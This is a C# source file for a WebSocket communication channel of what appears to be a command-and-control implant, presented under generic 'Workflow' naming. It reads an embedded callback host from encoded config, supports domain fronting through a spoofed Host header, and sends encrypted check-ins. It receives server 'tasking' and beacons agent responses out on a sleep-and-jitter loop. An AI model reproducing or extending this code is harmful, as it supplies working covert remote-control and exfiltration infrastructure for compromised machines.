using Workflow.Contracts;
using Workflow.Models;
using Workflow.Utilities;
using System.Net.WebSockets;
using System.Text.Json;
using Websocket.Client;

namespace Workflow.Channels.Websocket
{
    public class Websocket : IChannel
    {
        private ILogger logger { get; set; }
        private IServiceConfig agentConfig { get; set; }
        private IDataBroker messageManager { get; set; }
        private ISecurityProvider crypt { get; set; }
        private string url { get; set; }
        private string endpoint { get; set; }
        private string userAgent { get; set; }
        private string hostHeader { get; set; }
        public int connectAttempt { get; set; }    
        public int maxAttempts { get; set; }
        private WebsocketClient _client { get; set; }
        private CancellationTokenSource cancellationTokenSource { get; set; } = new CancellationTokenSource();
        public event EventHandler<TaskingReceivedArgs>? SetTaskingReceived;
        private bool checkedIn = false;
        private ManualResetEventSlim checkinAvailable = new ManualResetEventSlim(false);
        private CheckinResponse? cir;
        public Websocket(IServiceConfig config, ISecurityProvider crypto, ILogger logger, IDataBroker messageManager)
        {
            this.agentConfig = config;
            this.crypt = crypto;
            this.logger = logger;
            this.messageManager = messageManager;

            var opts = JsonSerializer.Deserialize(
                ChannelConfig.Decode(),
                WebsocketChannelOptionsJsonContext.Default.WebsocketChannelOptions);

            int callbackPort = opts.CallbackPort;
            string callbackHost = opts.CallbackHost;
            this.endpoint = opts.Endpoint;
            this.url = $"{callbackHost}:{callbackPort}/{this.endpoint}";
            this.userAgent = opts.UserAgent;
            this.hostHeader = opts.DomainFront;
            this.maxAttempts = 5;
            this.connectAttempt = 0;

            var factory = new Func<ClientWebSocket>(() =>
            {
                var client = new ClientWebSocket
                {
                    Options =
                    {
                        KeepAliveInterval = TimeSpan.FromSeconds(0),
                    }
                };

                this._client.ReconnectTimeout = null;

                if (!String.IsNullOrEmpty(this.hostHeader))
                {
                    client.Options.SetRequestHeader("Host", this.hostHeader);
                }

                client.Options.SetRequestHeader("Accept-Type", "Push");

                return client;
            });

            this._client = new WebsocketClient(new Uri(this.url), factory);
            this._client.MessageReceived.Subscribe(msg =>
            {
                WebSocketMessage wm = JsonSerializer.Deserialize<WebSocketMessage>(msg.Text, WebsocketJsonContext.Default.WebSocketMessage);

                if (!checkedIn)
                {
                    cir = JsonSerializer.Deserialize(this.crypt.Decrypt(wm.data), CheckinResponseJsonContext.Default.CheckinResponse);
                    checkinAvailable.Set();
                    return;
                }

                GetTaskingResponse gtr = JsonSerializer.Deserialize(this.crypt.Decrypt(wm.data), GetTaskingResponseJsonContext.Default.GetTaskingResponse);
                TaskingReceivedArgs tra = new TaskingReceivedArgs(gtr);

                SetTaskingReceived(this, tra);
            });

            this._client.ReconnectionHappened.Subscribe(info => { });
            this._client.DisconnectionHappened.Subscribe(info => { });
            this._client.Start().Wait();
        }
        public async Task<CheckinResponse> Checkin(Checkin checkin)
        {
            do
            {
                if (await this.Send(JsonSerializer.Serialize(checkin, CheckinJsonContext.Default.Checkin)))
                {
                    break;
                }

                this.connectAttempt++;
            } while (this.connectAttempt <= this.maxAttempts);

            checkinAvailable.Wait();

            this.checkedIn = true;


            return this.cir;
        }
        public async Task StartBeacon()
        {
            this.cancellationTokenSource = new CancellationTokenSource();
            while (!cancellationTokenSource.Token.IsCancellationRequested)
            {
                await Task.Delay(Misc.GetSleep(this.agentConfig.sleep, this.agentConfig.jitter) * 1000);

                if (!this.messageManager.HasResponses())
                {
                    continue;
                }
                try
                {
                    await this.Send(messageManager.GetAgentResponseString());
                }
                catch (Exception e)
                {
                    this.connectAttempt++;
                }

                if (this.connectAttempt >= this.maxAttempts)
                {
                    this.cancellationTokenSource.Cancel();
                    await this._client.Stop(WebSocketCloseStatus.EndpointUnavailable, "Exiting");
                    this._client.Dispose();
                }
            }
        }
        public bool StopBeacon()
        {
            this.cancellationTokenSource.Cancel();
            return true;
        }
        private async Task<bool> Send(string json)
        {
            try
            {
                if (this._client.IsRunning)
                {
                    json = this.crypt.Encrypt(json);

                    WebSocketMessage m = new WebSocketMessage()
                    {
                        client = true,
                        data = json,
                        tag = String.Empty
                    };

                    string message = JsonSerializer.Serialize(m, WebsocketJsonContext.Default.WebSocketMessage);

                    this._client.Send(message);
                }
            }
            catch
            {
                return false;
            }

            return true;
        }
    }
}
